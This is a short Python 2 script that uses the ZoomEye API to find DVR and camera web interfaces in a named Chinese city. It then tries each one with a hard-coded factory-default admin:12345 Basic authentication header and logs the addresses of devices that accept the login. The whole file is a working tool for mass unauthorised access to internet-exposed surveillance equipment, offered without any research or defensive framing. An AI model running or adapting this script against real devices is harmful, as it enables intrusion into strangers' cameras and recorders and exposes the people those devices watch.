import json
import urllib
import urllib2
import urlparse
import time
from xml.etree import ElementTree
import httplib
from selenium import webdriver
files=file("log.txt","a+")
header={"If-Modified-Since":"0","Accept":"*/*","Authorization":"Basic YWRtaW46MTIzNDU=","X-Requested-With":"XMLHttpRequest",
"Accept-Language":"zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","User-Agent":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)",
"Host":"","DNT":"1","Connection":"close"}
loginpath="/PSIA/Custom/SelfExt/userCheck"
def writeintofile(str):
    files.writelines(str+"\n")
def loginreq(url):
    repeat_time = 0
    urlp=urlparse.urlparse(url)
    header["Host"]=urlp[1]
    req=urllib2.Request(url,None,header)
    while True:
        try:
            res = urllib2.urlopen(req,None,1)
            return res
        except:
            print "Open Url Failed !!! Repeat"
            time.sleep(1)
            repeat_time = repeat_time+1
            if repeat_time == 5:
                return None
def login(url):
    urlp=urlparse.urlparse(url)
    urlreq=urlp[0]+"://"+urlp[1]+loginpath
    print urlreq
    res=loginreq(urlreq)
    if(res==None):
        return
    try:
        xml=ElementTree.fromstring(res.read())
        print xml.findtext("statusString")
        if(xml.findtext("statusString")=="OK"):
            writeintofile(urlreq)
        return
    except Exception:
        print "Cannot Parse!"
        return None
    #if(xml.findtext("statusString")=="OK"):
        #print "find"
def zoomeyelogin():
    url="https://api.zoomeye.org/user/login"
    temp="""{"username":"","password":""}"""   #username填入ZoomEye的用户名，passwore填入密码，否则会加载失败！！！！
    header={}
    req=urllib2.Request(url,temp,header)
    res=urllib2.urlopen(req)
    dict=json.loads(res.read())
    return dict['access_token']
def finddevice(token,page):
    url="https://api.zoomeye.org/host/search?"
    header={"Authorization":"JWT "+token}
    temp={"query":"DVRDVS-Webs country:China city:Jiangmen","page":page}
    param=urllib.urlencode(temp)
    url=url+param
    print url
    req=urllib2.Request(url,None,header)
    res=urllib2.urlopen(req)
    end=res.read()
    jsonend=json.loads(end)
    matches=jsonend["matches"]
    for ls in matches:
        print ls["ip"]+":"+str(ls["portinfo"]["port"])
        print ls["geoinfo"]["city"]["names"]["en"]
        urlreq="http://"+ls["ip"]+":"+str(ls["portinfo"]["port"])+"/"
        login(urlreq)
token=zoomeyelogin()
print token
finddevice(token,10)
#HEFEI 5